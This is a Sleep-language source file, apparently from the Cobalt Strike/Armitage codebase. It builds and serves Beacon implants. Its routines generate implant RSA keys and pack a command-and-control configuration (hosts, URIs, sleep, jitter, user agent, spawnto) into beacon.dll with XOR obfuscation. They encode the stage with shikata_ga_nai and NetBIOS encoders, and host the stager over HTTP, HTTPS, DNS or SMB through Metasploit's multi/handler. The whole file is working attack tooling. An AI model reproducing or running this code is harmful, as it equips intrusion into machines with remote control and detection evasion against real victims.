#
# Code to Setup a Beacon Listener and Generate the DLL
#

import msf.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import javax.swing.*;
import javax.imageio.*;
import ui.*;
import console.*;
import armitage.*;
import c2profile.*;

import cloudstrike.*;

sub beacon_asymmetric {
	local('$h $secret');

	# generate our RSA key pair for asymmetric crypto [if we need to]
	if (!-exists ".cobaltstrike.beacon_keys") {
		$h = openf(">.cobaltstrike.beacon_keys");
		writeObject($h, [dns.AsymmetricCrypto generateKeys]);
		closef($h);
	}

	$h = openf(".cobaltstrike.beacon_keys");
	$secret = readObject($h, -1);
	closef($h);

	return [new dns.AsymmetricCrypto: $secret];
}

# beacon_obfuscate("*blob*")
sub beacon_obfuscate {
	local('$c $patch $x');
	$patch = $1;
	$c = allocate();
	for ($x = 0; $x < strlen($patch); $x++) {
		writeb($c, chr( (byteAt($patch, $x) ^ 0x69) & 0xFF ));
	}		
	closef($c);
	$patch = readb($c, -1);
	closef($c);
	return $patch;
}

# gets a Beacon stage.
sub api_stage_beacon {
	local('$handle $data $name');

	($name) = $2;

	if ($name in %bartifacts && -exists %bartifacts[$name]) {
		$handle = openf(%bartifacts[$name]);
		$data   = readb($handle, -1);
		closef($handle);
		return %(data => $data);
	}
	return %(error => "$name doesn't exist");
}

sub api_get_beacon_dll {
	local('$handle $data $name');

	($name) = $2;

	if ($name in %bdlls && -exists %bdlls[$name]) {
		$handle = openf(%bdlls[$name]);
		$data   = readb($handle, -1);
		closef($handle);
		return %(data => $data);
	}
	return %(error => "$name doesn't exist");
}

# returns a list of the stage types we have (should only be two)
sub api_stage_list_beacon {
	return keys(%bartifacts);
}

# some extra works to host Beacon's stager
sub api_host_beacon_stager {
	local('$exception $port $www $server $file');
	try {
		($port, $file) = $2;
		if ($port !in %servers) {
			%servers[$port] = [new WebServer: int($port)];
			[%servers[$port] addWebListener: &serverHit];
		}
		$www = %servers[$port];
	
		$server = [new MalleableStager: $c2profile, ".http-stager", [new File: $file]];
		[$server setup: $www, "stager"];
	}
	catch $exception {
		print_error("$exception (beaconsetup.sl:92)");
		return %(status => "$exception");
	}
	return %(status => "success");
}

# starts Beacon: arguments - port
sub api_start_beacon {
	local('$h $exception $u $x $ssl');

	try {
		global('$security $asecurity');
		$security = [new dns.QuickSecurity];
		$asecurity = beacon_asymmetric();

		local('$port $www $server $migrate $wantdns $bdll $odata $domains');
		($port, $migrate, $wantdns, $domains, $ssl) = $2;
		if ($port !in %servers) {
			%servers[$port] = [new WebServer: int($port), $ssl, [$c2profile getSSLKeystore]];
			[%servers[$port] addWebListener: &serverHit];
		}
		$www = %servers[$port];
	
		$server = [new MalleableHook: $c2profile, "beacon", "beacon handler"];
		[$server setup: $www, ".http-get", &process_beacon];

		$server = [new MalleableHook: $c2profile, "beacon", "beacon post handler"];
		[$server setup: $www, ".http-post", &process_beacon_post];

		# setup a DNS server... (do this only once)
		if ($wantdns && $dns is $null) {
			$dns = [new dns.DNSServer];
			[$dns installHandler: &api_check_beacon];
			[$dns go];
		}

		# clear these values... since we just restarted the server			
		global('%checks %conversations');
		%checks['stage'] = $null;
		%conversations['stage'] = $null;
	}
	catch $exception {
		print_error("$exception (beaconsetup.sl:134)");
		return %(status => "$exception");
	}

	# setup the reflective DLL... includes patching it...
	fork({
		local('$iport $handle $dllf $bytes $data $data2 $h $patch $index $index2 $jid $bdll $odata $c $x $r $domain $ua_all $st');

		# extract our beacon DLL... 
		if ($migrate) {
			$dllf  = dropFile("resources/migrate.dll", "beaconm", ".dll");
		}
		else {
			$dllf  = dropFile("resources/beacon.dll", "beacon", ".dll");
		}

		# read the DLL in please
		$h = openf($dllf);
		$data = readb($h, -1);
		closef($h);

		# load beacon.dll...
		if ($migrate) {
			$bdll = [SleepUtils getIOHandle: resource("resources/beacon.dll"), $null];
			$odata = $data;
			$data = readb($bdll, -1);
		}

		# trim them down...
		if (strlen($domains) > 254) {
			$domains = substr($domains, 0, 254);
		}

		# generate host/uri pairings
		local('$urlz $ua @urls');
		$urlz = split(" ", [$c2profile getString: ".http-get.uri"]);

		foreach $domain (split(",\\s*", $domains)) {
			push(@urls, @($domain, rand($urlz)));
		}

		# trim our pairings down to something sane...
		while (size(@urls) > 1 && strlen( join(",", flatten(@urls)) ) > 255) {
			print_info("dropping " . join("", pop(@urls)) . " from Beacon profile for size");
		}

		# pick a random Internet Explorer User Agent string
		$ua = randua();

		$st = int([$c2profile getString: ".sleeptime"]);

		# get the submit uri...
		local('$submit $recover');
		$submit = rand(split(" ", [$c2profile getString: ".http-post.uri"]));

		# patch in the recover program...
		$recover = [$c2profile recover_binary: ".http-get.server.output"];

		# transform
		local('$httpget $httppost $getsize $djitter $maxdns $proto $spawnto');
		$httpget  = [$c2profile apply_binary: ".http-get.client"];
		$httppost = [$c2profile apply_binary: ".http-post.client"];
		$getsize  = [$c2profile size: ".http-get.server.output", 1024 * 1024];
		$spawnto  = [$c2profile getString: ".spawnto"];

		$djitter = int([$c2profile getString: ".jitter"]);
		if ($djitter < 0 || $djitter > 99) { $djitter = 0; }

		$maxdns  = int([$c2profile getString: ".maxdns"]);
		if ($maxdns < 1 || $maxdns > 255) { $maxdns = 255; }

		# apply a flag if we are supposed to do DNS comms
		if ($ssl) {
			$proto = $wantdns | 0x8;
		}
		else {
			$proto = $wantdns;
		}

		# put together the binary...
		$patch = pack("S- S- I- I- S- S- Z256 Z256 Z128 Z64 Z256 Z256 Z256 Z64", 
			$proto, 				# S-   | Our protocol [0x8 = HTTPS, 0x1 = DNS, 0x0 = HTTP, 0x2=SMB]
			$port, 					# S-   | Port
			int($st), 				# I-   | Default Sleep Time (in ms)
			int($getsize),				# I-   | Max HTTP GET size
			$djitter,				# S-   | Default Jitter factor (0-100)
			$maxdns,				# S-   | Max DNS x-mit in bytes
			[$asecurity exportPublicKey],		# Z256 | RSA Public Key
			join(",", flatten(@urls)) . "\x00", 	# Z256 | host, uri, host, uri, ...
			$ua . "\x00", 				# Z128 | User-Agent string
			$submit . "\x00", 			# Z64  | Submit URI
			$recover . "\x00\x00\x00\x00", 		# Z256 | RECOVER http-get.server.output
			$httpget . "\x00\x00\x00\x00", 		# Z256 | TRANSFORM http-get.client
			$httppost . "\x00\x00\x00\x00",		# Z256 | TRANSFORM http-post.client
			$spawnto . "\x00");			# Z64  | Where we spawn code to

		# obfuscate our patch, it stages over the wire in clear text... grr, need to do something about that later
		$patch = beacon_obfuscate($patch);

		$index = indexOf($data, "AAAABBBBCCCCDDDDEEEEFFFF");
		$data = replaceAt($data, $patch, $index);

		# patch beacon.dll into migrate.dll if we're trying to migrate
		if ($migrate) {
			# write out what we have to a DLL...
			$h = openf("> $+ $dllf");
			writeb($h, $data);
			closef($h);

			# now process that stage, so we have something we can embed into our migrate shell
			$data = build_beacon_stage($dllf, %(EnableStageEncoding => "false", StageEncoder => "generic/none"));

			$index2 = indexOf($odata, "AAAABBBBCCCCDDDD");
			$odata = replaceAt($odata, pack('I-', strlen($data)) . $data, $index2);

			# make $data migrate.dll, that's where we want to finish up at...
			$data = $odata;
		}

		# save to r2.dll
		$h = openf("> $+ $dllf");
		writeb($h, $data);
		closef($h);

		# build shikata_ga_nai encoded DLL
		$data = build_beacon_stage($dllf, %(StageEncoder => "x86/shikata_ga_nai"));

		if ($wantdns) {
			# use an existing DLL as it was already made position independent by MSF
			$data2 = netbiosEncoder($data);
			print_good("encoded beacon stage [" . strlen($data2) . " bytes] with NetBIOS encoder");

			# I want to take a look at it.
			$h = openf(">test.txt");
			writeb($h, $data2);
			closef($h);
		}

		# save our shikata_ga_nai encoded DLL please (with .enc extension)
		$h = openf("> $+ $dllf $+ .enc");
		writeb($h, $data);
		closef($h);

		# register a hander for the stager URL...
		call_async($mclient, "beacon.host_stager", $port, "$dllf $+ .enc");

		# set $stage in &api_check_beacon to point to our alpha mixed data for staging over DNS
		let($dnsf, $stage => $data2);

		# announce stuff...
		print_good("The patched DLL is: " . strlen($patch) . " $dllf $+ .enc");

		# do some book keeping on the type of Beacon we want to make available for export
		if ($wantdns) {
			%bartifacts["HTTP Beacon"] = $null;
			%bartifacts["DNS Beacon"] = "$dllf $+ .enc";
			%bdlls["HTTP Beacon"] = $null;
			%bdlls["DNS Beacon"] = $dllf;
		}
		else {
			%bartifacts["DNS Beacon"] = $null;
			%bartifacts["HTTP Beacon"] = "$dllf $+ .enc";
			%bdlls["DNS Beacon"] = $null;
			%bdlls["HTTP Beacon"] = "$dllf";
		}

		# cleanup after ourselves plz (we don't need these files anymore)
		deleteOnExit($dllf);
		deleteOnExit("$dllf $+ .enc");
	}, \$mclient, \$port, \$migrate, \$wantdns, \$client, \$domains, $dnsf => &api_check_beacon, \%bartifacts, \%bdlls, \$c2profile, \$ssl, \$asecurity);
	return %(status => "success");
}

# $1 = dll file, $2 = additional options to set
sub build_beacon_stage {
	local('$iport $jid $data %o $k $v $dwait');
	$iport = randomPort();

	# setup options
	%o = %(DLL => $1, LPORT => $iport, LHOST => '127.0.0.1', ExitOnSession => 'true', PAYLOAD => "windows/dllinject/bind_tcp", EnableStageEncoding => "true", WfsDelay => 300, Proxies => "");
	foreach $k => $v ($2) {
		%o[$k] = $v;
	}

	$dwait = fork({
		local('$handle $bytes $data');
		$handle = listen($iport, 0);
	
		# read a 4-byte integer stating the size of our data. I use I- to account for the byte order
		$bytes = bread($handle, "I-")[0];
		$data = readb($handle, $bytes);
		closef($handle);
		closef($iport);

		print_good("encoded beacon stage [" . strlen($data) . " bytes] with $encoder in " . (ticks() - $start) . "ms");
		return $data;
	}, \$iport, $start => ticks(), $encoder => $2['StageEncoder']);

	sleep(1000);

	# start the handler and let it connect to us...
	$jid = call($mclient, "module.execute", "exploit", "multi/handler", %o)['job_id'];

	# wait for our data..
	try {
		$data = wait($dwait, 120000);
	}
	catch $ex {
		[ArmitageMain print_error: "Create stage failed: " . %o];
	}

	# we can kill the job now...
	call_async($mclient, "job.stop", $jid);

	return $data;
}

# generate a random User-Agent for whoever asks
sub api_random_useragent {
	local('$handle $ua');
	if ([$c2profile getString: ".useragent"] eq "<RAND>") {
		$handle = [SleepUtils getIOHandle: resource("resources/ua.txt"), $null];
		$ua = rand(readAll($handle));
		closef($handle);
	}
	else {
		$ua = [$c2profile getString: ".useragent"];
	}
	return %(useragent => $ua);
}

# creates a DLL for P2P beacon... needed for the bind_tcp and reverse_tcp beacon staging
sub api_start_beacon_smb {
	local('$dllf $h $data $patch $c $x $index $data $c $spawnto $asecurity');

	# extract our beacon DLL... 
	$dllf  = dropFile("resources/beacon.dll", "beacon", ".dll");

	# read the DLL in please
	$h = openf($dllf);
	$data = readb($h, -1);
	closef($h);

	# spawnto! 
	$spawnto = [$c2profile getString: ".spawnto"];

	# make our keypair...
	$asecurity = beacon_asymmetric();

	# put together the binary... ($wantdns = 2 means become a peer and wait for a link)
	$patch = pack("S- S- I- I- S- S- Z256 Z256 Z128 Z64 Z256 Z256 Z256 Z64", 
		2, 				# S-   | Our protocol
		4444, 				# S-   | Port
		1000, 				# I-   | Default Sleep Time (in ms)
		1024 * 1024,			# I-   | 1MB (max size of a transaction)
		0,				# S-   | jitter factor
		0,				# S-   | max dns len
		[$asecurity exportPublicKey],	# Z256 | RSA PubKey
		"\x00", 			# Z256 | host, uri, host, uri, ...
		"\x00", 			# Z128 | User-Agent string
		"\x00", 			# Z64  | Submit URI
		"\x00\x00\x00\x00", 		# Z256 | RECOVER http-get.server.output
		"\x00\x00\x00\x00", 		# Z256 | TRANSFORM http-get.client
		"\x00\x00\x00\x00",             # Z256 | TRANSFORM http-post.client
		$spawnto . "\x00");		# Z64  | Where we spawn code to

	# obfuscate our patch, it stages over the wire in clear text... grr, need to do something about that later
	$patch = beacon_obfuscate($patch);

	$index = indexOf($data, "AAAABBBBCCCCDDDDEEEEFFFF");
	$data = replaceAt($data, $patch, $index);

	# save to r2.dll
	$h = openf("> $+ $dllf");
	writeb($h, $data);
	closef($h);

	# cleanup after ourselves.
	deleteOnExit($dllf);

	# we don't know where we're run from.. setg the old fashioned way...
	$c = createConsole($client);
	call_async($client, "console.write", $c, "setg DLL $dllf $+ \n");
	call_async($client, "console.release", $c);

	# we need our SMB Beacon to point to a file that's encoded and ready to inject
	fork({
		local('$data $h');
		$data = build_beacon_stage($dllf, %(StageEncoder => "x86/shikata_ga_nai"));

		# save our shikata_ga_nai encoded DLL please (with .enc extension)
		$h = openf("> $+ $dllf $+ .enc");
		writeb($h, $data);
		closef($h);

		# something we can safely inject
		%bartifacts["SMB Beacon"] = "$dllf $+ .enc";

		# auto-delete this thing later
		deleteOnExit("$dllf $+ .enc");

		print_good("Beacon peer set up as $dllf $+ .enc");
	}, \%bartifacts, \$dllf, \$mclient, \$client);

	%bdlls["SMB Beacon"] = $dllf;
	return $dllf;
}

sub randua {
	local('$ua $handle');
	# pick a random Internet Explorer User Agent string
	if ([$c2profile getString: ".useragent"] eq "<RAND>") {
		$handle = [SleepUtils getIOHandle: resource("resources/ua.txt"), $null];
		$ua = rand(readAll($handle));
		closef($handle);
	}
	else {
		$ua = [$c2profile getString: ".useragent"];
	}

	return $ua;
}
